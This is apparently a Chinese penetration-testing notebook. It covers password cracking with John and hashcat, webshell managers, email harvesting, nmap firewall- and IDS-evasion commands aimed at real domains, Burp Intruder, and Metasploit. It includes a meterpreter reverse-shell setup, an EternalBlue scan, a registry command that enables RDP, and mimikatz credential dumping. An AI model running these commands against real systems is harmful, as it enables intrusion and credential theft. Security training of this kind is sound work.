运行 John the Ripper 的基本语法是 john [options] [hashfile]。使用John最基本的语法是“john hashes.txt”，它尝试了一系列常见的破解模式。此命令告诉 John 尝试简单模式，然后是包含可能密码的默认单词列表，最后是增量模式。以这种方式使用 John 非常耗时，不建议用于密码/哈希破解。
比较推荐的密码/哈希破解方法是使用单词列表并指定哈希类型。为此，选项 --wordlist 用于指定具有潜在密码列表的文件，而 --format 用于指定哈希类型。例如，将这些选项与 snefru-256 哈希类型一起使用的语法是“john --wordlist=rockyou.txt --format=snefru-256 hashes.txt”。要查看用于破解哈希 2b4d9aa78976ec807986c1ea298d32418c85581b5625796c49bd6ecc146b1ef9（已添加到文件 hashes.txt）的此语法的示例
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602125119510.png)
于密码位于rockyou.txt 文件中并且snefru-256 被识别为正确的哈希类型，因此密码/哈希破解花费的时间非常短。这个过程并不总是那么快，可能需要数小时才能破解更复杂的密码/哈希。

##### hashcat

我们将介绍的第二个密码破解工具叫做 hashcat，它和 John 一样，是一个密码测试和哈希破解工具。这个工具也是免费的和多平台的，就像 John 一样，支持 300 多种哈希类型。使用 hashcat 的基本语法是 hashcat [options] [hashfile] [wordlist]。

要执行哈希/密码破解，我们需要指定哈希类型和攻击模式。设置这些的选项是 -m 选择散列类型和 -a 指定攻击类型。与 John 不同的是，哈希类型不是由它们的名字指定的；相反，数字用于标识哈希类型。例如，我们将破解 LM 密码哈希。要将 LM 指定为哈希类型，请使用数字 3000。

hashcat 的哈希模式标识符的其他示例是：

100 - SHA1
500 - md5crypt
1000 - NTLM
1400 - SHA-256
2500 - WPA/WPA2
3000 - LM
7900 - Drupal7
22100 - 比特锁

我们设置的下一个选项是 -a 选项，它有五种不同的攻击模式。这些模式是 0 Straight、1 Combination、3 Brute-force、6 Hybrid Wordlist + Mask 和 7 Hybrid Mask + Wordlist。对于我们的哈希破解尝试，我们使用了“直接”攻击模式，也称为字典攻击模式。此模式尝试使用指定单词列表中的所有单词破解哈希，而不是尝试暴力攻击。

综上所述，我们在图 1.5 中用于攻击的语法是“hashcat -m 3000 -a 0 hashes.txt /root/Desktop/rockyou.txt”。运行此命令后，hashcat 会返回系统信息和有关字典缓存的信息。处理完哈希后，该工具会将其结果返回给用户。图 1.6 显示我们破解密码的尝试是成功的，LM 哈希包含密码“passphrase”。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602125712368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 后门管理工具
菜刀现在已经用得不是很多了，被很多网站已经禁止掉了。现在用得多的是蚁剑和冰蝎。这些管理工具都有一句话后门代码
**中国菜刀**

一款 web Shell管理类工具 ，它的开发者是一位台湾人是一位退伍军人,它的支持很广泛 只要是动态网站都支持，软件支持多个国家语言显示。中国菜刀仅支持windows操作系统，从网络上下载 中国菜刀压缩包，解压压缩包到一个任意文件夹。2016版下载链接：https://github.com/raddyfiy/caidao-official-version/blob/master/caidao-20160622.zip
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712140651445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


以下有一些比较新的工具可尝试，使用方法都大同小异。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210626214416634.png)

### 邮箱信息

#### 搜集

**只适用于大型网站**
要想爆破邮箱账号，肯定首先得有足够多的邮箱账号。那么，我们从哪里去获取目标邮箱系统的邮箱账号呢？

https://hunter.io/  
https://www.email-format.com/i/search/
这两个网站只要输入目标域名，就可以从互联网上搜到对应格式的邮箱账号

#### 验证是否被弃用

https://mailtester.com/testmail.php
https://github.com/Tzeross/verifyemail

## 综合工具

### 信息搜集

#### 电子邮件

从侦察阶段收集到的针对所有用户的大规模攻击，有很多很棒的资源可用于侦查和创建可定位的电子邮件地址列表，比如2019年的OSINT资源，The Harvester ，datasploit ，Github上的awesome-osint ）

#### theHarvester

TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、PGP、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602182750844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602183054356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### sparta

kali已经集成，Sparta是一个Nmap、Nikto、Hydra等工具的集合，利用各个工具的优秀功能，完成信息收集、扫描和爆破等一体化的工具流。

Sparta主要包含以下功能：

端口扫描，程序自动调用nmap进行扫描，根据nmap的扫描结果，nikto自动加载结果，展开更精确的扫描。
针对扫描的结果，特定使用，如：使用dirbuster目录爆破，利用webslayer进行web指纹识别。
针对可爆力破解的端口，可调用hydra进行暴力破解。

**使用方法**
第一次在kali 中使用 需要先下载文件 

```bash
#这是我克隆到码云的，会加快国内下载速度。如果你不信任这个链接，请将链接改成  https://github.com/SECFORCE/sparta.git
git clone https://gitee.com/ngadminq/sparta.git

#切换到sparta文件夹，检索到sparta.py文件，利用python环境进行运行
python3 sparta.py
```

**#**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609161602160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### 帮助手动测试

#### hackbar

**安装**
可以被安装在浏览器上，也可以被安装在burp上
测试SQL注入,XSS漏洞和网站的安全性[谷歌火狐安装链接破解，亲测可用](https://www.cnblogs.com/rab3it/p/11010446.html)

跟踪中继器选项卡并右键单击屏幕上的任意位置。结束后，我们可以看到一个新选项排列为“Hackbar”。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604011001878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



#### nmap

有时候你希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个/<numbit>在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有 <numbit>相同比特的所有IP地址或主机。 例如，192.168.10.0/24将会扫描192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和192.168.10.255 (二进制格式: 11000000 10101000 00001010 11111111)之间的256台主机。 192.168.10.40/24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org/16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是/1， 这将会扫描半个互联网。最大值是/32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。

**安装**

> Mac os : brew install nmap
> centos: yum install nmap
> Ubuntu apt-get install nmap
> kali: 有集成

**攻击网站扫描参数**
此参数将尽可能全面、隐蔽。
有些参数耗时将很长，显示文档将太过全面。所以读者可以适当调整

```bash
nmap -A -d -sF -T0 --osscan-guess -p- -P0 --script=vuln 
--spoof-mac 09:22:71:11:15:E2 --version-intensity 9
 –D decoy1,decoy2,decoy3,target
```

**常见扫描方案**
更全面扫描

> -A 扫描目标的操作系统、开放端口以及路由等相关信息，如图7
> -v 冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。使用这个选项，你可以得到事半功倍的效果。
> -p- 扫描所有端口。默认nmap只扫描常见的危险1000个端口，但端口有6w多个。有的程序员为了图方便，并不会将端口拒绝访问，而是比如不允许开放22敏感端口，程序员换到了2222
>
> 使用-d选项可以得到更加详细的信息。
> -T4指定扫描过程使用的时序（Timing），总有6个级别（0-5）速度越快越容易被发现

粗略扫描

>-p 指定端口uo
>-F 快速扫描模式，只扫描在nmap-services文件中列出的端口。

扫描类型
 全扫描
扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。

全扫描实现简单，且以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。

半扫描
在半扫描中，仅发送SYN数据段，如果应答为RST，则端口处于关闭状态，若应答为SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而且部分防火墙已经开始对这种扫描方式做处理。

 FIN扫描
FIN扫描是向目标发送一个FIN数据包，如果是开放的端口，会返回RST数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。

这种方式并不在TCP三次握手的状态中，所以不会被记录，相对SYN扫描要更隐蔽一些。

```bash
#syn：因为不必全部打开一个TCP连接，所以这项技术通常称为半开扫描(half-open)。你可以发出一个TCP同步包(SYN)，然后等待回应。如果对方返回SYN|ACK(响应)包就表示目标端口正在监听;如果返回RST数据包，就表示目标端口没有监听程序;如果收到一个SYN|ACK包，源主机就会马上发出一个RST(复位)数据包断开和目标主机的连接，这实际上有我们的操作系统内核自动完成的。这项技术最大的好处是，很少有系统能够把这记入系统日志。不过，你需要root权限来定制SYN数据包；
nmap -sS www.baidu.com
#TCP，全连接：默认扫描方式，扫描快但这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。
nmap -sT www.baidu.com
#UCP扫描：扫描慢
nmap -sU www.baidu.com
#其他更隐秘的参入如-sN,
#-sF利用FIN扫描方式探测防火墙状态。FIN扫描方式用于识别端口是否关闭，收到RST回复说明该端口关闭，否则说明是open或filtered状态,-sX

# 运行端口完全欺骗扫描，伪装成额外主机对目标进行扫描
nmap -sl xxx
```

躲避被记录

> -D 使用诱饵扫描方法对目标网络/主机进行扫描。如果nmap使用这种方法对目标网络进行扫描，那么从目标主机/网络的角度来看，扫描就象从其它主机(decoy1，等)发出的。从而，即使目标主机的IDS(入侵检测系统)对端口扫描发出报警，它们也不可能知道哪个是真正发起扫描的地址，哪个是无辜的。这种扫描方法可以有效地对付例如路由跟踪、response-dropping等积极的防御机制，能够很好地隐藏你的IP地址。每个诱饵主机名使用逗号分割开，你也可以使用ME选项，它代表你自己的主机，和诱饵主机名混杂在一起。如果你把ME放在第六或者更靠后的位置，一些端口扫描检测软件几乎根本不会显示你的IP地址。如果你不使用ME选项，nmap会把你的IP地址随机夹杂在诱饵主机之中。注意:你用来作为诱饵的主机应该正在运行或者你只是偶尔向目标发送SYN数据包。很显然，如果在网络上只有一台主机运行，目标将很轻松就会确定是哪台主机进行的扫描。或许，你还要直接使用诱饵的IP地址而不是其域名，这样诱饵网络的域名服务器的日志上就不会留下关于你的记录.使用太多的诱饵扫描能够减缓你的扫描速度甚至可能造成扫描结果不正确。同时，有些ISP会把你的欺骗包过滤掉。虽然现在大多数的ISP不会对此进行限制。
> -S <源地址> 定义扫描源地址以便隐藏自己
> –spoof-MAC



 扫描时遇到防火墙怎么办？

>当防火墙禁止PING，-P0;-Pn 允许你关闭 ICMP pings.启动高强度扫描，可穿透防火墙，避免防火墙发现
>1 碎片扫描:Nmap发送8个字节的数据包绕过防火墙/IDS/IPS。在防火墙配置不当的时候有用。
>root@kali:~# nmap -f m.anzhi.com
>-f 、--mtu <val>: fragment packets (optionally w/given MTU)指定使用分片、指定数据包的MTU
>root@kali:~# nmap -mtu 8 m.anzhi.com
>2 诱饵扫描
>这种类型的扫描是非常隐蔽且无法察觉。目标由多个假冒或伪造IP地址进行扫描。这样防火墙就会认为攻击或扫描是通过多个资源或IP地址进行，于是就绕过了防火墙。
>诱饵在初始的ping扫描（使用ICMP，SYN，ACK等）使用，在实际的端口扫描阶段使用。诱饵在远程操作系统检测（-O）期间也使用。诱饵不在版本检测工作或TCP连接扫描中使用。
>这实际上在目标看来是由多个系统同时扫描，这使得防火墙更难追查扫描的来源。
>有两种方式来执行诱饵扫描：
>nmap –D RND:10 TARGET

>root@kali:~# nmap -D RND:10 m.anzhi.com
>root@kali:~# nmap –D decoy1,decoy2,decoy3 m.anzhi.com
>3 空闲扫描
>攻击者将首先利用一个空闲的系统并用它来扫描目标系统。

扫描的工作原理是利用某些系统中采用可预见的IP序列ID生成。为了使空闲扫描成功，僵尸主机的系统必须是在扫描时间处于闲置状态。
在这种技术中会隐藏攻击者的IP地址。

>root@kali:~# nmap -P0 -sI zombie m.anzhi.com
>4 随机数据长度
>root@kali:~# nmap --data-length 25 m.anzhi.com
>root@kali:~# nmap --randomize-hosts 103.17.40.69-100
>root@kali:~# nmap -sl 211.211.211.211m.anzhi.com
>5 欺骗扫描
>root@kali:~# nmap --sT -PN --spoof-mac 0 m.anzhi.com
>root@kali:~# nmap --badsum m.anzhi.com
>root@kali:~# nmap -g 80 -S www.baidu.com m.anzhi.com
>root@kali:~# nmap -p80 --script http-methods --script-args http.useragent=”Mozilla 5”m.anzhi.com


4.选项–source-port
每个TCP数据包带有源端口号。默认情况下Nmap会随机选择一个可用的传出源端口来探测目标。该–source-port选项将强制Nmap使用指定的端口作为源端口。这种技术是利用了盲目地接受基于特定端口号的传入流量的防火墙的弱点。端口21（FTP），端口53（DNS）和67（DHCP）是这种扫描类型的常见端口。

nmap --source-port port target



5.随机数据长度
附加随机数据长度，我们也可以绕过防火墙。许多防火墙通过检查数据包的大小来识别潜伏中的端口扫描。这是因为许多扫描器会发送具有特定大小的数据包。为了躲避那种检测，我们可以使用命令–data-length增加额外的数据，以便与默认大小不同。在下图中，我们通过加入25多个字节改变数据包大小。

nmap --data-length number target



6.随机顺序扫描目标：
选项–randomize-host用于随机 顺序扫描指定目标。–randomize-host有助于防止因连续 扫描多个目标而防火墙和入侵检测系统检测到。

nmap --randomize-hosts targets




8、发送错误校验

在某些防火墙和IDS / IPS，只会检查有正确校验包的数据包。因此，攻击者通过发送错误校验欺骗IDS / IPS。

nmap --badsum target
绕开防火墙与IDS（入侵检测系统）的检测与屏蔽，以便能够更加详细地发现目标主机的状况。分片（可疑的探测包进行分片处理）、IP诱骗（真实IP地址和其他主机的IP地址混合使用）、IP伪装（自己发送的数据包中的IP地址伪装成其他主机的地址）、 指定源端口（目标主机只允许来自特定端口的数据包通过防火墙，伪装指定端口）、扫描延时（防火墙针对发送过于频繁的数据包会进行严格的侦查）

nmap  -Pn -sS -A -D 192.168.1.1,192.168.1.11,192.168.1.53 -e eth0 -f -g 80 nmap.org

更精确扫描

>探测系统，虽然默认自带。但是探测性会更弱，使用--osscan-guess;--fuzzy或更专业一点
>提高扫描强度，默认扫描强度是7，最低0，最高9. --version-intensity

脚本
查看有哪些脚本`cat  /usr/share/nmap/scripts/script.db` 

> --script whois-domain.nse
> --script dns-brute
> --script http:stored-xss
> --script=vuln
> auth: 负责处理鉴权证书（绕开鉴权）的脚本  
> broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  
> brute: 提供暴力破解方式，针对常见的应用如http/snmp等  
> default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  
> discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  
> dos: 用于进行拒绝服务攻击  
> exploit: 利用已知的漏洞入侵系统  
> external: 利用第三方的数据库或资源，例如进行whois解析  
> fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  
> malware: 探测目标机是否感染了病毒、开启了后门等信息  
> safe: 此类与intrusive相反，属于安全性脚本  
> version: 负责增强服务与版本扫描（Version Detection）功能的脚本  
> vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067,也包括检测如xss等

输出

> -oX
> -oG
> -oN

**经验**
1.有服务却扫不到？要么是开了防护软件，要么是在内网也就是说他只把比如80端口映射出来，这时候你虽然能访问网站却无法进行扫描，
**nmap类似工具**
Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。
nmap扫描准确，并且显示信息详细，但是速度太慢；

**nbtscan**

**masscan** 该工具兼容Nmap 参数
扫描快但是不会显示端口服务的相关信息，将Nmap和Masscan结合，扬长避短，实现高效率扫描。为提高扫描效率，可以先使用masscan扫描开启的端口，再用nmap进行详细的扫描.[nmap](https://xz.aliyun.com/t/6001)![在这里插入图片描述](https://img-blog.csdnimg.cn/20210429021050113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

高阶：[Nmap绕过防火墙扫描](]()

虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品：

unicornscan
hping3
masscan 最快的扫描工具，但是功能没有nmap强大
amap
Metasploit scanning module

#### hping3

主要测试防火墙拦截规则，对网络进行测试

### 抓包工具

#### Wireshark

Wireshark是绝对经典的，最著名的网络分析仪和密码破解工具。此工具是网络数据包分析器，该工具将尝试捕获用于分析，网络故障排除，分析，软件和通信协议开发的网络数据包，并尽可能详细地显示获得的数据包数据。
在Wireshark中，有颜色代码，用户可以看到以黑色，蓝色和绿色突出显示的数据包。一眼就能帮助用户识别流量类型。黑色确定存在问题的TCP数据包。蓝色是DNS流量，绿色是TCP流量。
Wireshark是一个开源的免费数据包分析器。您可以访问其网站（https://www.wireshark.org/download.htmlZ）并下载与您的系统兼容的安装程序。

#### BurpSuite

Fuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。
Discover Content是Burp中专门用于此目的的工具。
Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。
FuzzDB包含一些用于此目的的非常牛逼的字典。

burpsuite当抓不到包时，可能是目标网站是个无发送数据包的网站，比如只有一些静态的js代码，你的交互都是在目标主机本机运行，因此就不会展示数据包。比如你也许认为上传操作都可以抓到数据包，然而事实上是有的数据包是js操作，所以根本就不会反馈数据包给你

在面试和实战中需要区分burpsuite攻击参数注入的基本方式

1. Sniper（狙击手）
   顾名思义，就是一个一个的来，就跟98K一样，一ju一个准。也是最基础的一种模式。
   添加了一个参数的话，并且假设payload有500个的话，那就执行500次，


如果添加了两个参数的话，就会挨着来，第一个参数开始爆破时，第二个不变，如此这样，会进行500+500此 总共1000次爆破。


2. Battering ram（攻城锤）
   顾名思义，和狙击手差不多，一个参数的话都一样，只不过如果添加了两个参数的话，就一起进行爆破。那么两个参数爆破时候的值肯定就是一样的了。那么就只会进行500次爆破。

3. Pitchfork（草叉模式）
   此模式下如果只添加了一个参数的话，会报错


添加了两个参数的话 ，要求添加两个payload
pl1：1，2
pl2：3，4
那么第一爆破为 1，3
而二次爆破为2，4
如果两个payload行数不一致的话，取最小值进行测试。所以爆破的次数取两个中最小的为准。

4. Cluster bomb（集束炸弹）
   同pitchfork，起码两个参数，但此操作会计算两个的payload 的笛卡儿积。
   比如pl1：1，2，3
   pl2：4，5，6
   那么第一次爆破为 1，4
   第二次为1，5
   以此类推 1，6
   2，4
   2，5.。。。。。。


##### 插件


burpsuite如何爆破401､脱库

Burp Suite是Web应用程序测试的最佳工具之一，其多种功能可以帮我们执行各种任务.请求的拦截和修改,扫描web应用程序漏洞,以暴力破解登陆表单,执行会话令牌等多种的随机性检查。
hex是网站raw的二进制,在进行00截断时很有用。
对于扫描的结果如果有更进一步的探究在扫描结果里右击repeater。在burpsuite里扫描分为主动和被动被动扫描更温和，不会破坏程序和主动扫描显得更暴力但更全面，通常采用的都是主动扫描。
通过burpsuitede的repeater功能可以获取一些服务器信息，比如运行的Server类型及版本、PHP版本信息。repeater分析的选项有四种
虽然 burpsuite专业版才带有scaner，但笔者测试感觉这个功能不是很好用。![在这里插入图片描述](https://img-blog.csdnimg.cn/2021051200383657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


**模块**
repeater是结合其他模块一起使用的，做补发测试，得到的内容再进一步做手动修改参数
compare用于对比两次数据的差异，比如枚举用户名，查看返回登录结果的差异
Intruder是一个高度可配置工具，可以对web自动化攻击，模糊测试，sql注入，目录遍历等
[burpsuite 超全教程](https://t0data.gitbooks.io/burpsuite/content/)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210427161650538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### 漏洞扫描工具

注意:登录类网站扫描要带cookies扫才能扫到

#### Awvs

awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接

#### AppScan

一个Web漏洞扫描程序，主要适用于Windows系统。 https://blog.csdn.net/weixin_41924764/article/details/109549947





#### kali

Kali Linux是基于Debian面向网络安全人员的Linux发行版，由BackTrack发展而来。现由Offensive Security公司开发和维护，其内置许多网络安全工具，因此常用来做渗透测试和数字鉴证。kali有600+渗透工具，是目前黑客的最佳选择工具。



![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510222251130.png)

https://blog.csdn.net/jayjaydream/article/details/82945384


#### 安装kali

很多黑客教学都是首先教你装一个虚拟机，再将kali系统装在虚拟机上。如果你用这样方式去攻击外网服务器，那么你可能需要使用到端口转化/端口映射。
但是最好的最快的方式是用U盘。一旦移除U盘，你的系统就将恢复
Kali安装到u盘加密、持久化    https://www.freebuf.com/sectool/271770.html

如果你不想系统直接变为KALI,且电脑装虚拟机卡顿，就在 https://cloud.tencent.com/online-service?from=developer|auth 注册一个云服务吧，我选的学生认证，价格是27/3月，但这个认证可选择而对系统较少，我没法直接选择Debian，就选择了centos，![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616164431360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
然后一步步跟随以下命令就可以安装成功。具体可以参考博客 https://blog.csdn.net/sc_Pease/article/details/107243610

```bash
yum install docker
systemctl start docker
systemctl status docker
docker pull registry.cn-hangzhou.aliyuncs.com/fordo/kali:latest
docker run -i -t 53e9507d8515 /bin/bash
```

安装成功后，进入kali系统后，输入nmap，打印如下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616170405781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
安装后你可能存在的问题：
腾讯云

> 1.频繁掉线
>
> kali无窗口

##### Metasploit

如果你是第一次使用这个工具，那么工具的可视化界面将对你更友好，更加熟悉msf目录结构。

```bash
# 初始化msfdb数据库。如果你不用这个命令直接执行可视化系统仍旧会指导你先进行初始化
msfdb initb
armitage
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210522014217527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

set RHOST 10.101.2.11（被攻击机IP）
set LHOST 192.168.207.130（设置本地IP）
set LPORT 4444(设置连接端口)
set payload windows/x64/meterpreter/reverse_tcp（配置回链方式）

**基础使用方法**
以smb为例

```bash
# 1. 启动msf
service postgresql start
msfconsole

# 2.搜索相关漏洞
search smb

# 3. 进入该漏洞列表
# show payloads可以查看需要设置哪些参数
use auxiliary/scanner/smb/smb_ms17_010

# 4.设置相关参数
# show options可以查看需要设置哪些参数
set RHOSTS 10.101.2.11

#5. 执行利用漏洞
run
```

因为metasploit出现使得成为一名黑客的门槛降低了，这款工具将渗透过程变得简单和自动化。当一个漏洞出来时，在metaspolit会更新，你将可以用此工具做漏洞验证，当数月后漏洞修复了，那么此工具会公开漏洞利用的脚本。
![ 啊啊啊啊](https://img-blog.csdnimg.cn/20210510222731371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
在kali中启动msf方法



![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510223458722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510225928292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021051022594197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 拿到shell后

###### windows

**常见操作**

```bash
sysinfo爆出系统信息
screenshot截屏，截屏后的图片存放在/root/中
```

meterpreter >shell，进入靶机cmd
在这里插入图片描述
此时，可以新建文件夹，然后
meterpreter >upload植入已经写好的木马！<此中方法，以后再做>
也可以通过使用msf中的mimikatz，来爆出靶机的用户名和密码，以下是其过程：
首先

netstat -an< 查靶机端口开发情况>


如果没有开启3389端口，可以使用以下命令再cmd中开启：

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
1
其次

meterpreter > load mimikatz
meterpreter > help


meterpreter > msv <获取的是hash值>


meterpreter > ssp <获取的是明文信息>


meterpreter > wdigest <读取内存中存放的账号密码明文信息>


meterpreter > kerberos <同widgest类似，我也没有弄清楚，如果大佬知道，还望指点>


接下来，就是远程登录靶机

rdesktop 10.101.2.11


**metagoofil**

### 网站

**站长之家** [链接](http://tool.chinaz.com/nslookup/)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021042805293680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**reg007/0xreg**。可以查看目标用户使用这个邮箱还注册了哪些网站

**nslookup**  查询IP
[站长之家-在线nslookup执行，当然你也可以在kali直接利用或者将工具下载下来,这三种方式的查询结果都一样！](http://tool.chinaz.com/nslookup/)如果有幸拿到真实IP后，就可以对该IP的端口信息(开放端口和服务漏洞)、指纹信息（中间件版本，历史漏洞）、历史解析域名和域名的历史解析IP（拓展出更多资产）做进一步的探测。



# web安全

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210624194508899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


一个任意链接特殊字符意义：  *https://www.baidu.com/s?ie=UTF-8&wd=owasp&tn=88093251_74_hao_pg*  用？隔开参数和资源，字段之间用&分开。有的网站如果只利用Content-Type字段判断文件类型，那么修改了就能恶意上传文件了。



# 待补充：系统：攻击

## 经典漏洞

### 永恒之蓝

# 第三方攻击

第三方发现更看重第六感，你需要随缘的测试一些命令。第三方通常是不会在端口端展示的，他可能出现在一些目录里
手动尝试，比如拼接url/phpmyadmin 这个三方工具(来自于网站使用phpstudy搭建)的默认账号和密码是root root
weblogic
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629190027774.png)

# web:攻击

# APP封装

 网站的框架被封装在APP中，因此你从网站下载的app入侵成功后很可能你同步拿下了网站的。以下方式获得的结果有很大的不同，你应该配合使用
 **获取信息方式1.burpsuite**
 使用APP获取封装的网页，你需要利用好抓包工具burpsuite
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629214132940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

 在抓到相应的http链接后，你很可能遇到的情况是当你直接利用浏览器去访问请求的http时，无法得到你用app返回的数据包，你用浏览器返回的数据包很可能是个报错如403等界面。这时候你需要仔细检查你用APP发送的数据包与你用web发送的数据包异同点，将你的web发送的请求直接改成APP发送的数据包请求

直接用插件修改请求头也是可以访问仅限APP的网站![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627142638922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627143012153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**获取信息方式2.逆向编译工具**
漏了个大洞，一键提取，且加了反编译  
下载 https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw
提取码：k5se
